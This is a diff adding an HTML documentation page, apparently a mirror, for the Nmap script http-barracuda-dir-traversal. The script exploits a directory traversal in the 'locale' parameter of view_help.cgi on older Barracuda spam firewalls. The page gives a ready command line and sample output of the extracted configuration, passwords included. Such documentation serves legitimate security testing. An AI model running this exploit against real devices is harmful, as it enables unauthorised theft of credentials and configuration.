@@ -1,0 +1,303 @@
+﻿   <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html>
+<head>
+    <title>http-barracuda-dir-traversal NSE Script -VER007</title>
+    
+
+</HEAD>
+
+
+
+
+
+
+<a href="../nmap-script-help.html">HOME>>>>>>>>></a>
+
+
+
+<h1>File <code>http-barracuda-dir-traversal</code></h1>
+
+
+
+<p>
+
+
+<a href="http://nmap.org/book/nse-script-format.html#nse-format-rules">脚本使用类型</a>:
+portrule
+<br>
+
+  脚本所属分类:
+  <i><a href="http://nmap.org/nsedoc/categories/intrusive.html">intrusive</a></i>, <i><a href="http://nmap.org/nsedoc/categories/exploit.html">exploit</a></i>, <i><a href="http://nmap.org/nsedoc/categories/auth.html">auth</a></i>
+  <br>
+
+脚本下载地址: <a href="http://nmap.org/svn/scripts/http-barracuda-dir-traversal.nse">http://nmap.org/svn/scripts/http-barracuda-dir-traversal.nse</a>
+</p>
+
+
+
+<h2> User Summary </h2>
+
+<p>
+Attempts to retrieve the configuration settings from a Barracuda
+Networks Spam &amp; Virus Firewall device using the directory traversal
+vulnerability described at
+<a href="http://seclists.org/fulldisclosure/2010/Oct/119">http://seclists.org/fulldisclosure/2010/Oct/119</a>.
+</p>
+<p>
+This vulnerability is in the "locale" parameter of
+"/cgi-mod/view_help.cgi" or "/cgi-bin/view_help.cgi", allowing the
+information to be retrieved from a MySQL database dump.  The web
+administration interface runs on port 8000 by default.
+</p>
+<p>
+Barracuda Networks Spam &amp; Virus Firewall &lt;= 4.1.1.021 Remote Configuration Retrieval
+Original exploit by ShadowHatesYou &lt;Shadow@SquatThis.net&gt;
+For more information, see:
+<a href="http://seclists.org/fulldisclosure/2010/Oct/119">http://seclists.org/fulldisclosure/2010/Oct/119</a>
+<a href="http://www.exploit-db.com/exploits/15130/">http://www.exploit-db.com/exploits/15130/</a></p>
+
+
+
+
+
+
+
+  
+  
+  
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+  
+  
+    
+    
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+  
+  
+    
+    
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+
+
+  <h2> Script Arguments </h2>
+  <p>
+    
+      <h4> http-max-cache-size </h4>
+      <p>
+Set max cache size. The default value is 100,000.
+		   Barracuda config files vary in size mostly due to the number
+		   of users. Using a max cache size of 5,000,000 bytes should be 
+		   enough for config files containing up to 5,000 users.</p>
+
+    
+
+    
+      <h4> smbdomain, smbhash, smbnoguest, smbpassword, smbtype, smbusername </h4>
+      See the documentation for the <a href="http://nmap.org/nsedoc/lib/smbauth.html#script-args">smbauth</a> library.
+    
+      <h4> http.max-cache-size, http.max-pipeline, http.pipeline, http.useragent </h4>
+      See the documentation for the <a href="http://nmap.org/nsedoc/lib/http.html#script-args">http</a> library.
+    
+  </p>
+
+
+<h2> Example Usage </h2>
+<p>执行格式
+
+  <pre>nmap --script http-barracuda-dir-traversal --script-args http-max-cache-size=5000000 -p &lt;port&gt; &lt;host&gt;
+</pre>
+
+</p>
+
+
+  <h2> Script Output </h2>
+<pre>PORT   STATE SERVICE   REASON
+8000/tcp open  http    syn-ack Barracuda Spam firewall http config
+| http-barracuda-dir-traversal:
+| Users: 256
+| Device: Barracuda Spam Firewall
+| Version: 4.1.0.0
+| Hostname: barracuda
+| Domain: example.com
+| Timezone: America/Chicago
+| Language: en_US
+| Password: 123456
+| API Password: 123456
+| MTA SASL LDAP Password: 123456
+| Gateway: 192.168.1.1
+| Primary DNS: 192.168.1.2
+| Secondary DNS: 192.168.1.3
+| DNS Cache: No
+| Backup Server: ftp.example.com
+| Backup Port: 21
+| Backup Type: ftp
+| Backup Username: user
+| Backup Password: 123456
+| NTP Enabled: Yes
+| NTP Server: update01.barracudanetworks.com
+| SSH Enabled: Yes
+| BRTS Enabled: No
+| BRTS Server: fp.bl.barracudanetworks.com
+| HTTP Port: 8000
+| HTTP Disabled: No
+| HTTPS Port: 443
+| HTTPS Only: No
+|
+| Vulnerable to directory traversal vulnerability:
+|_http://seclists.org/fulldisclosure/2010/Oct/119
+</pre>
+
+
+
+  <h2> Requires </h2>
+  <ul>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/http.html">http</a></li>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/shortport.html">shortport</a></li>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/stdnse.html">stdnse</a></li>
+  
+     <li><a href="">string</a></li>
+  
+     <li><a href="">table</a></li>
+  
+  </ul>
+
+
+<hr/>
+
+
+
+
+
+
+<p><b>Author: </b>Brendan Coles</p>
+
+
+
+<p><b>License: </b> VER007 整理 <a href="http://www.ver007.com">http://www.ver007.com</a></p>
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+</BODY>
+</HTML>
+
+
